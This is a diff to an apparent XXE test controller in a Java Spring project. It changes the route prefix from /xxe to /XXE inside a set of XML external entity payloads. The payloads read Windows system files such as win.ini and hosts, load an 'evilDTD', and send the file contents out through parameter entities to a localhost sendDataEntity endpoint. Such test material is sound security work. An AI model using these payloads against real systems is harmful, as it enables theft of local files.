@@ -15,7 +15,7 @@ import java.io.*;
 
 @Api(tags = "XXE 测试")
 @RestController
-@RequestMapping("/xxe")
+@RequestMapping("/XXE")
 public class XXETestController {
 
     private static final String testCaseA =
@@ -24,8 +24,8 @@ public class XXETestController {
                     "<!ENTITY xxe1 SYSTEM \"file:///C:/Windows/win.ini\" >" + "\r\n" +
                     "<!ENTITY http \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
                     "<!ENTITY xxe2 SYSTEM \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
-                    "<!ENTITY send \"http://localhost:8080/xxe/sendDataElement?data=&file;&xxe1;\" >" + "\r\n" +
-                    "<!ENTITY xxe3 SYSTEM \"http://localhost:8080/xxe/sendDataElement?data=&file;&xxe1;\" >" + "\r\n" +
+                    "<!ENTITY send \"http://localhost:8080/XXE/sendDataElement?data=&file;&xxe1;\" >" + "\r\n" +
+                    "<!ENTITY xxe3 SYSTEM \"http://localhost:8080/XXE/sendDataElement?data=&file;&xxe1;\" >" + "\r\n" +
             " ]>" + "\r\n" +
             "<example>" + "\r\n" +
                     "<file>&file;</file>" + "\r\n" +
@@ -39,7 +39,7 @@ public class XXETestController {
     private static final String testCaseB1 =
             "<!DOCTYPE param [" + "\r\n" +
                     "<!ENTITY % file1 \"file:///C:/Windows/win.ini\" >" + "\r\n" +
-                    "<!ENTITY % send0 SYSTEM \"http://localhost:8080/xxe/sendDataEntity?data=%file1;%file2;\" >" + "\r\n" +
+                    "<!ENTITY % send0 SYSTEM \"http://localhost:8080/XXE/sendDataEntity?data=%file1;%file2;\" >" + "\r\n" +
                     "<!ENTITY % file2 \"file:///C:/Windows/System32/drivers/etc/hosts\" >" + "\r\n" +
                     "%send0;" + "\r\n" +
             " ]>" + "\r\n" +
@@ -51,16 +51,16 @@ public class XXETestController {
             "<!ENTITY % xxe1 SYSTEM \"file:///C:/Windows/win.ini\" >" + "\r\n" +
             "<!ENTITY % http \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
             "<!ENTITY % xxe2 SYSTEM \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
-            "<!ENTITY % send1 SYSTEM \"http://localhost:8080/xxe/sendDataEntity?data=%file;\" >" + "\r\n" +
+            "<!ENTITY % send1 SYSTEM \"http://localhost:8080/XXE/sendDataEntity?data=%file;\" >" + "\r\n" +
             "<!ENTITY % fake \"" + "\r\n" +
-                    "<!ENTITY &#37; send2 SYSTEM 'http://localhost:8080/xxe/sendDataEntity?data=%file;' >" + "\r\n" +
-                    "<!ENTITY &#37; send3 SYSTEM 'http://localhost:8080/xxe/sendDataEntity?data=%xxe1;' >" + "\r\n" +
-                    "<!ENTITY &#37; send4 SYSTEM 'http://localhost:8080/xxe/sendDataEntity?data=%xxe2;' >" + "\r\n" +
+                    "<!ENTITY &#37; send2 SYSTEM 'http://localhost:8080/XXE/sendDataEntity?data=%file;' >" + "\r\n" +
+                    "<!ENTITY &#37; send3 SYSTEM 'http://localhost:8080/XXE/sendDataEntity?data=%xxe1;' >" + "\r\n" +
+                    "<!ENTITY &#37; send4 SYSTEM 'http://localhost:8080/XXE/sendDataEntity?data=%xxe2;' >" + "\r\n" +
             "\" >";
 
     private static final String testCaseB2 =
             "<!DOCTYPE param [" + "\r\n" +
-                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/xxe/evilDTD\" >" + "\r\n" +
+                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/XXE/evilDTD\" >" + "\r\n" +
                     "%dtd; %send1;" + "\r\n" +
             " ]>" + "\r\n" +
             "<param>" + "\r\n" +
@@ -68,7 +68,7 @@ public class XXETestController {
 
     private static final String testCaseB3 =
             "<!DOCTYPE param [" + "\r\n" +
-                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/xxe/evilDTD\" >" + "\r\n" +
+                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/XXE/evilDTD\" >" + "\r\n" +
                     "%dtd; %fake; %send2;" + "\r\n" +
             " ]>" + "\r\n" +
             "<param>" + "\r\n" +
@@ -76,7 +76,7 @@ public class XXETestController {
 
     private static final String testCaseB4 =
             "<!DOCTYPE param [" + "\r\n" +
-                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/xxe/evilDTD\" >" + "\r\n" +
+                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/XXE/evilDTD\" >" + "\r\n" +
                     "%dtd; %fake; %send3;" + "\r\n" +
             " ]>" + "\r\n" +
             "<param>" + "\r\n" +
@@ -84,7 +84,7 @@ public class XXETestController {
 
     private static final String testCaseB5 =
             "<!DOCTYPE param [" + "\r\n" +
-                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/xxe/evilDTD\" >" + "\r\n" +
+                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/XXE/evilDTD\" >" + "\r\n" +
                     "%dtd; %fake; %send4;" + "\r\n" +
                     " ]>" + "\r\n" +
             "<param>" + "\r\n" +
